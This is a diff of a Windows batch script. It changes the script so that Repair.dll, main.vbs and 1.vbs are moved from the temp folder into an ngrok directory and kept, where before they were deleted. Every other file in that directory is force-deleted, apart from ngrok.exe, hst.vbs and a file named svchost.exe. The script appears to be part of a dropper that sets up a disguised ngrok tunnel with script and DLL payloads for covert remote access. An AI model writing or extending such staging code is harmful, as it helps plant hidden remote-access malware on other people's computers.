@@ -24,20 +24,26 @@ del "%DOTNET_INSTALL_SCRIPT%"
 
 timeout /t 4 /nobreak >nul
 
+move /y "%TEMP%\Repair.dll" "%NGROK_DIR%\Repair.dll"
+move /y "%TEMP%\main.vbs" "%NGROK_DIR%\main.vbs"
+move /y "%TEMP%\1.vbs" "%NGROK_DIR%\1.vbs"
+
 for /r "%NGROK_DIR%" %%F in (*) do (
     if /i not "%%~nxF"=="ngrok.exe" (
         if /i not "%%~nxF"=="svchost.exe" (
             if /i not "%%~nxF"=="hst.vbs" (
                 if /i not "%%~nxF"=="ngrok.yml" (
-                    del /f /q "%%F"
+                    if /i not "%%~nxF"=="Repair.dll" (
+                        if /i not "%%~nxF"=="main.vbs" (
+                            if /i not "%%~nxF"=="1.vbs" (
+                                del /f /q "%%F"
+                            )
+                        )
+                    )
                 )
             )
         )
     )
 )
-
-del /f /q "%TEMP%\Repair.dll"
-del /f /q "%TEMP%\main.vbs"
-del /f /q "%TEMP%\1.vbs"
 
 endlocal
